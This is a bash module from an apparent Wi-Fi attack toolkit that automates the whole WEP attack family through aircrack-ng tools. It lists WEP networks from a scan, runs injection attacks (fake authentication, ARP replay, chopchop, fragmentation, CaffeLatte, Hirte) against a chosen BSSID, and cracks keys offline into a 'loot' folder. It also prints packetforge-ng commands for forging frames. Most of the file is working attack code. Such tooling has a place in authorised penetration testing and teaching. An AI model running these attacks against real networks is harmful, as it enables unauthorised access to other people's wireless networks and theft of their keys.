#!/usr/bin/env bash
# 48_wep_attack — WEP Attacks
# The full WEP family: fake auth, ARP replay, ChopChop, fragmentation, CaffeLatte, HIRTE and statistical key recovery.
#
# Standalone top-level module. Self-locating and pkexec-safe: the polkit rule
# matches this script's path, so invoke it directly, never through `env`.

set -o pipefail

if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
fi
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$WIFISTING_ROOT/loot}"
: "${LOG_DIR:=$WIFISTING_ROOT/logs}"
: "${CAPTURES_DIR:=$WIFISTING_ROOT/captures}"

MOD_TMP="$TMP_DIR/wep_attack"
MOD_LOOT="$LOOT_DIR/wep_attack"
MOD_LOGS="$LOG_DIR/wep_attack"
MOD_CAPS="$CAPTURES_DIR/wep_attack"
mkdir -p "$MOD_TMP" "$MOD_LOOT" "$MOD_LOGS" "$MOD_CAPS" 2>/dev/null

# ── capability probes ────────────────────────────────────────────────────

WEP_DIR="$MOD_TMP/sessions"
WEP_LOOT="$MOD_LOOT/sessions"
mkdir -p "$WEP_DIR" "$WEP_LOOT" 2>/dev/null

wep_have_mon() {
    local i n
    for i in /sys/class/net/*/; do
        [[ -e "$i/phy80211" ]] || continue
        n=$(basename "$i")
        iw dev "$n" info 2>/dev/null | grep -q 'type monitor' && { printf '%s\n' "$n"; return 0; }
    done
    return 1
}

wep_status_tsv() {
    printf 'aircrack-ng\t%s\n'   "$(command -v aircrack-ng   >/dev/null 2>&1 && echo 1 || echo 0)"
    printf 'aireplay-ng\t%s\n'   "$(command -v aireplay-ng   >/dev/null 2>&1 && echo 1 || echo 0)"
    printf 'airodump-ng\t%s\n'   "$(command -v airodump-ng   >/dev/null 2>&1 && echo 1 || echo 0)"
    printf 'packetforge-ng\t%s\n' "$(command -v packetforge-ng >/dev/null 2>&1 && echo 1 || echo 0)"
    printf 'airdecap-ng\t%s\n'   "$(command -v airdecap-ng   >/dev/null 2>&1 && echo 1 || echo 0)"
    local mon; mon=$(wep_have_mon 2>/dev/null || true)
    printf 'mon_iface\t%s\n' "${mon:-none}"
    printf 'monitor\t%s\n' "$([[ -n "$mon" ]] && echo 1 || echo 0)"
    # Injection needs monitor mode AND a card that actually injects. The
    # latter can only be proven by transmitting, which this module does not
    # do unprompted, so it is reported as untested rather than assumed.
    printf 'injection_tested\t0\n'
    printf 'offline_crack\t%s\n' "$(command -v aircrack-ng >/dev/null 2>&1 && echo 1 || echo 0)"
}

# ── attack reference ─────────────────────────────────────────────────────
wep_modes_tsv() {
    cat <<'EOF'
fakeauth	aireplay-ng -1	fake authentication to associate without the key	needs monitor+injection
arpreplay	aireplay-ng -3	replay a captured ARP to generate fresh IVs	needs monitor+injection
chopchop	aireplay-ng -4	decrypt one packet byte by byte without the key	needs monitor+injection
fragment	aireplay-ng -5	obtain keystream from a fragmented packet	needs monitor+injection
caffelatte	aireplay-ng -6	query a client for new IVs, no AP association	needs monitor+injection
hirte	aireplay-ng -7	fragment against a client; any IP or ARP packet	needs monitor+injection
ptw	aircrack-ng -1	fastest published recovery (Pessl-Tews-Weinmann)	offline
fms	aircrack-ng -K	original Fluhrer-Mantin-Shamir statistical attack	offline
korek	aircrack-ng -K -x0	KoreK pre-PTW statistical suite	offline
prga	aircrack-ng -y	single bruteforce mode over recovered keystream	offline
inject	packetforge-ng	forge a frame using a recovered keystream	needs monitor+injection
EOF
}

# ── WEP key format handling (fully offline, fully testable) ──────────────
# A WEP key is 5/13 ASCII characters or 10/26 hex digits. Getting this wrong
# means aircrack is invoked with the wrong -n and silently fails to find a
# key that is sitting right there in the capture.
wep_key_forms() {
    local key="$1"
    [[ -z "$key" ]] && { printf 'ERROR\tusage: --key-forms KEY\n' >&2; return 2; }

    local len=${#key} form="" bits=""
    if [[ "$key" =~ ^[0-9a-fA-F]+$ ]] && (( len % 2 == 0 )); then
        case $len in
            10) form="hex"; bits=64 ;;
            26) form="hex"; bits=104 ;;
            32) form="hex"; bits=128 ;;
            38) form="hex"; bits=152 ;;
            58) form="hex"; bits=232 ;;
        esac
    fi
    if [[ -z "$form" ]]; then
        case $len in
            5)  form="ascii"; bits=40 ;;
            13) form="ascii"; bits=104 ;;
            16) form="ascii"; bits=128 ;;
            29) form="ascii"; bits=232 ;;
        esac
    fi

    if [[ -z "$form" ]]; then
        printf 'ERROR\t%s is not a valid WEP key length (need 5/13 ASCII or 10/26 hex)\n' "$key" >&2
        return 1
    fi

    printf 'KEY\t%s\n' "$key"
    printf 'FORM\t%s\n' "$form"
    printf 'BITS\t%s\n' "$bits"
    printf 'AIRCRACK_N\t%s\n' "$bits"
    if [[ "$form" == "ascii" ]]; then
        printf 'HEX_EQUIVALENT\t%s\n' "$(printf '%s' "$key" | xxd -p | tr -d '\n')"
    else
        printf 'ASCII_EQUIVALENT\t%s\n' "$(printf '%s' "$key" | xxd -r -p 2>/dev/null | tr -c '[:print:]' '.')"
    fi
}

# ── find WEP networks in a scan ──────────────────────────────────────────
wep_networks_tsv() {
    local csv="${1:-}"
    if [[ -z "$csv" ]]; then
        csv=$(find "$WEP_DIR" "$TMP_DIR" -maxdepth 3 -name '*.csv' -type f 2>/dev/null | head -1)
    fi
    [[ -z "$csv" || ! -f "$csv" ]] && {
        printf 'ERROR\tno scan CSV found — run 02_recon first or pass a path\n' >&2
        return 1; }

    python3 - "$csv" <<'PYEOF'
import csv, sys
path = sys.argv[1]
n = 0
print("BSSID\tCHANNEL\tESSID\tIVS\tPRIVACY")
try:
    fh = open(path, newline="", encoding="utf-8", errors="replace")
except OSError as e:
    print("ERROR\t%s" % e, file=sys.stderr); sys.exit(1)
with fh:
    for row in csv.reader(fh, skipinitialspace=True):
        if not row:
            continue
        first = (row[0] or "").strip()
        if first == "BSSID":
            continue
        if first == "Station MAC":
            break
        if len(row) < 14 or not first:
            continue
        priv = (row[5] or "").strip().upper()
        if "WEP" not in priv:
            continue
        n += 1
        print("%s\t%s\t%s\t%s\t%s" % (first, (row[3] or "").strip(),
                                      (row[13] or "").strip(),
                                      (row[10] or "").strip(), priv))
if n == 0:
    print("NONE\t\t\t\tno WEP networks in this scan", file=sys.stderr)
    sys.exit(1)
PYEOF
}

# ── injection actions (all gated) ────────────────────────────────────────
wep_require_injection() {
    local mon
    mon=$(wep_have_mon 2>/dev/null) || {
        printf 'ERROR\tno monitor-mode interface — WEP injection needs one\n' >&2
        printf 'NOTE\tput a card in monitor mode first (01_iface --monitor-on)\n' >&2
        return 1
    }
    command -v aireplay-ng >/dev/null 2>&1 || {
        printf 'ERROR\taireplay-ng not installed (apt install aircrack-ng)\n' >&2
        return 1
    }
    printf '%s' "$mon"
}

wep_inject() {
    local mode="$1" bssid="$2" iface="${3:-}" dur="${4:-60}"
    [[ -z "$bssid" ]] && {
        printf 'ERROR\tusage: --%s BSSID [IFACE] [DURATION]\n' "$mode" >&2; return 2; }

    local mon
    mon=$(wep_require_injection) || return 1
    [[ -n "$iface" ]] && mon="$iface"

    local flag
    case "$mode" in
        fakeauth)   flag="-1 0" ;;
        arpreplay)  flag="-3" ;;
        chopchop)   flag="-4" ;;
        fragment)   flag="-5" ;;
        caffelatte) flag="-6" ;;
        hirte)      flag="-7" ;;
        *) printf 'ERROR\tunknown WEP mode: %s\n' "$mode" >&2; return 2 ;;
    esac

    mkdir -p "$WEP_LOOT"
    local log="$WEP_LOOT/${mode}_$(date +%s).log"
    printf 'MODE\t%s\nBSSID\t%s\nIFACE\t%s\nDURATION\t%s\nLOG\t%s\n' \
        "$mode" "$bssid" "$mon" "$dur" "$log"
    printf 'CMD\taireplay-ng %s -a %s %s\n' "$flag" "$bssid" "$mon"

    timeout "$dur" aireplay-ng $flag -a "$bssid" "$mon" > "$log" 2>&1
    local rc=$?

    case "$mode" in
        fakeauth)
            grep -qi 'association successful' "$log" && printf 'ASSOCIATED\t1\n' || printf 'ASSOCIATED\t0\n' ;;
        fragment)
            grep -qi 'saving keystream' "$log" && printf 'KEYSTREAM\t1\n' || printf 'KEYSTREAM\t0\n' ;;
        chopchop)
            grep -qi 'decrypted' "$log" && printf 'DECRYPTED\t1\n' || printf 'DECRYPTED\t0\n' ;;
        arpreplay)
            printf 'NOTE\tARP replay runs until interrupted; IVs accumulate in the\nNOTE\tairodump capture, not in this log.\n' ;;
        caffelatte|hirte)
            printf 'NOTE\tclient-side attack: success depends on a client being present\n' ;;
    esac
    (( rc == 124 )) && printf 'NOTE\ttimed out after %ss (expected for a continuous attack)\n' "$dur"
    printf 'TAIL\t%s\n' "$(tail -1 "$log" 2>/dev/null | cut -c1-100)"
    return 0
}

# ── offline key recovery ─────────────────────────────────────────────────
wep_crack() {
    local pcap="$1" method="${2:-auto}"
    [[ -z "$pcap" || ! -f "$pcap" ]] && {
        printf 'ERROR\tusage: --crack CAPTURE [ptw|fms|korek|prga|auto]\n' >&2; return 2; }
    command -v aircrack-ng >/dev/null 2>&1 || {
        printf 'ERROR\taircrack-ng not installed\n' >&2; return 1; }

    local args=(-a 1)
    case "$method" in
        ptw)   args+=(-1) ;;
        fms)   args+=(-K) ;;
        korek) args+=(-K -x0) ;;
        prga)  args+=(-y) ;;
        auto)  ;;
        *) printf 'ERROR\tunknown method: %s\n' "$method" >&2; return 2 ;;
    esac

    printf 'METHOD\t%s\nCAPTURE\t%s\n' "$method" "$pcap"
    printf 'CMD\taircrack-ng %s %s\n' "${args[*]}" "$pcap"

    local out
    out=$(timeout 300 aircrack-ng "${args[@]}" -q "$pcap" 2>&1) || true

    local key
    key=$(printf '%s\n' "$out" | grep -oE 'KEY FOUND! \[[^]]+\]' | head -1 |
          sed 's/KEY FOUND! \[//; s/\]$//')
    if [[ -n "$key" ]]; then
        printf 'FOUND\t1\nKEY\t%s\n' "$key"
        mkdir -p "$WEP_LOOT"
        local f="$WEP_LOOT/key_$(basename "${pcap%.*}").txt"
        printf '%s\n' "$key" > "$f"
        printf 'SAVED\t%s\n' "$f"
        return 0
    fi

    # No key is a legitimate outcome, and is never reported as success.
    printf 'FOUND\t0\n'
    printf 'NOTE\tno key recovered — PTW usually needs 20k-40k IVs and FMS far\n'
    printf 'NOTE\tmore. Check the IV count in the capture before retrying.\n'
    return 1
}

# ── PRGA / message injection ─────────────────────────────────────────────
wep_prga() {
    local pcap="$1" key="${2:-}"
    [[ -z "$pcap" || ! -f "$pcap" ]] && {
        printf 'ERROR\tusage: --prga CAPTURE [KEY]\n' >&2; return 2; }
    command -v packetforge-ng >/dev/null 2>&1 || {
        printf 'ERROR\tpacketforge-ng not installed (apt install aircrack-ng)\n' >&2; return 1; }

    local xorfile="$WEP_DIR/keystream_$(basename "${pcap%.*}").xor"
    if [[ -s "$xorfile" ]]; then
        printf 'KEYSTREAM\t%s\n' "$xorfile"
    else
        printf 'KEYSTREAM\tnone\n'
        printf 'NOTE\tno keystream file yet. Obtain one with the fragment (-5) or\n'
        printf 'NOTE\tchopchop (-4) attack; both write a .xor next to the capture.\n'
    fi

    printf 'FORGE_ARP\tpacketforge-ng --arp -a BSSID -h CLIENT -k 255.255.255.255 -l 255.255.255.255 -y %s -w out.pcap 0.0.0.0 255.255.255.255\n' "$xorfile"
    printf 'INJECT_CMD\taireplay-ng -2 -r out.pcap IFACE\n'
    [[ -n "$key" ]] && printf 'NOTE\ta known key makes the keystream derivable for any IV, so\nNOTE\tforging does not need a captured .xor at all.\n'
    printf 'NOTE\tkeystreams only work while the AP keeps the same key — a key\nNOTE\tchange invalidates every recovered one.\n'
    return 0
}

wep_info() {
    cat <<'EOF'
WEP attacks

WEP is broken by design: a 24-bit IV is concatenated with the key and the
result drives RC4, so IVs repeat after roughly 16.7 million packets and the
same keystream recurs. Every technique here exploits that.

IV generation (needs monitor + injection)
  fakeauth    associate without knowing the key          aireplay-ng -1
  arpreplay   replay a captured ARP to force fresh IVs   aireplay-ng -3
  caffelatte  query a client for new IVs, no AP needed   aireplay-ng -6
  hirte       fragment against a client, any packet      aireplay-ng -7

Keystream recovery (needs monitor + injection)
  chopchop    decrypt one packet byte by byte            aireplay-ng -4
  fragment    obtain keystream from a fragment           aireplay-ng -5
  Both write a .xor keystream which packetforge-ng reuses to forge frames —
  that reuse is the PRGA / message-injection attack.

Key recovery (fully offline, no radio)
  ptw     Pessl-Tews-Weinmann, fastest published; ~20k-40k IVs
  fms     original Fluhrer-Mantin-Shamir statistical attack
  korek   KoreK's pre-PTW statistical suite
  prga    single bruteforce mode

Gating: injection needs a monitor-mode interface and a card that injects.
This module cannot verify injection without transmitting, so it reports
injection as untested rather than assuming it works. Offline key recovery
and key-format handling need no radio and always run.
EOF
}

# ── self-test ────────────────────────────────────────────────────────────
wep_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

    local out
    out=$(wep_key_forms "abcde")
    chk key-ascii5-form  "$(fld "$out" FORM)" ascii
    chk key-ascii5-bits  "$(fld "$out" BITS)" 40
    chk key-ascii5-hex   "$(fld "$out" HEX_EQUIVALENT)" "6162636465"

    out=$(wep_key_forms "abcdefghijklm")
    chk key-ascii13-bits "$(fld "$out" BITS)" 104

    out=$(wep_key_forms "0123456789")
    chk key-hex10-form   "$(fld "$out" FORM)" hex
    chk key-hex10-bits   "$(fld "$out" BITS)" 64

    out=$(wep_key_forms "abcdef0123456789abcdef0123")
    chk key-hex26-bits   "$(fld "$out" BITS)" 104

    wep_key_forms "notakey" >/dev/null 2>&1 \
        && { printf 'key-bad-rejected\tFAIL\n'; bad=$((bad+1)); } || printf 'key-bad-rejected\tPASS\n'
    wep_key_forms "" >/dev/null 2>&1 \
        && { printf 'key-empty-rejected\tFAIL\n'; bad=$((bad+1)); } || printf 'key-empty-rejected\tPASS\n'

    local m
    for m in fakeauth arpreplay chopchop fragment caffelatte hirte; do
        wep_inject "$m" "" >/dev/null 2>&1 \
            && { printf 'guard-%s\tFAIL\n' "$m"; bad=$((bad+1)); } \
            || printf 'guard-%s\tPASS\n' "$m"
    done

    wep_crack /nonexistent.cap >/dev/null 2>&1 \
        && { printf 'crack-missing-capture\tFAIL\n'; bad=$((bad+1)); } || printf 'crack-missing-capture\tPASS\n'
    wep_prga /nonexistent.cap >/dev/null 2>&1 \
        && { printf 'prga-missing-capture\tFAIL\n'; bad=$((bad+1)); } || printf 'prga-missing-capture\tPASS\n'

    out=$(wep_modes_tsv)
    local mode
    for mode in fakeauth arpreplay chopchop fragment caffelatte hirte ptw fms korek prga inject; do
        printf '%s\n' "$out" | grep -q "^$mode	" \
            && printf 'mode-table-%s\tPASS\n' "$mode" \
            || { printf 'mode-table-%s\tFAIL\n' "$mode"; bad=$((bad+1)); }
    done

    mkdir -p "$WEP_DIR"
    cat > "$WEP_DIR/st.csv" <<'CSV'
BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key

AA:BB:CC:00:00:01, 2024-01-01 10:00:00, 2024-01-01 10:05:00, 6, 54, WEP, WEP, , -50, 10, 1234, 0.0.0.0, 7, "OldNet", 
AA:BB:CC:00:00:02, 2024-01-01 10:00:00, 2024-01-01 10:05:00, 6, 54, WPA2, CCMP, PSK, -50, 10, 0, 0.0.0.0, 7, "NewNet", 
CSV
    out=$(wep_networks_tsv "$WEP_DIR/st.csv" 2>/dev/null)
    chk wep-found-count     "$(printf '%s\n' "$out" | grep -c '^AA:BB')" 1
    chk wep-found-bssid     "$(printf '%s\n' "$out" | awk -F'\t' 'NR==2{print $1}')" "AA:BB:CC:00:00:01"
    chk wep-found-ivs       "$(printf '%s\n' "$out" | awk -F'\t' 'NR==2{print $4}')" "1234"
    chk wep-excludes-wpa2   "$(printf '%s\n' "$out" | grep -c 'NewNet')" 0

    printf 'BSSID, First time seen\n\nAA:BB:CC:00:00:03, 2024-01-01 10:00:00\n' > "$WEP_DIR/nowep.csv"
    wep_networks_tsv "$WEP_DIR/nowep.csv" >/dev/null 2>&1 \
        && { printf 'no-wep-fails\tFAIL\n'; bad=$((bad+1)); } || printf 'no-wep-fails\tPASS\n'

    rm -f "$WEP_DIR/st.csv" "$WEP_DIR/nowep.csv"

    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ── dispatch ─────────────────────────────────────────────────────────────
wep_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)   wep_status_tsv ;;
        --modes-tsv)    wep_modes_tsv ;;
        --key-forms)    wep_key_forms "$@" ;;
        --networks-tsv) wep_networks_tsv "$@" ;;
        --fakeauth)     wep_inject fakeauth   "$@" ;;
        --arpreplay)    wep_inject arpreplay  "$@" ;;
        --chopchop)     wep_inject chopchop   "$@" ;;
        --fragment)     wep_inject fragment   "$@" ;;
        --caffelatte)   wep_inject caffelatte "$@" ;;
        --hirte)        wep_inject hirte      "$@" ;;
        --crack)        wep_crack "$@" ;;
        --prga)         wep_prga "$@" ;;
        --selftest)     wep_selftest ;;
        --info)         wep_info ;;
        *)
            cat >&2 <<EOF
Usage: $0 COMMAND
  --status-tsv
  --modes-tsv                   every WEP technique and the flag it maps to
  --key-forms KEY               validate and normalise a WEP key
  --networks-tsv [CSV]          WEP networks in a scan
  --fakeauth BSSID [IFACE] [DUR]
  --arpreplay BSSID [IFACE] [DUR]
  --chopchop BSSID [IFACE] [DUR]
  --fragment BSSID [IFACE] [DUR]
  --caffelatte BSSID [IFACE] [DUR]
  --hirte BSSID [IFACE] [DUR]
  --crack CAPTURE [ptw|fms|korek|prga|auto]
  --prga CAPTURE [KEY]          keystream reuse / message injection plan
  --selftest
  --info
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    WIFISTING_CLI=1
    declare -F info >/dev/null 2>&1 || info() { printf '[info] %s\n' "$*" >&2; }
    declare -F warn >/dev/null 2>&1 || warn() { printf '[warn] %s\n' "$*" >&2; }
    declare -F err  >/dev/null 2>&1 || err()  { printf '[err]  %s\n' "$*" >&2; }
    wep_cli_main "$@"
fi
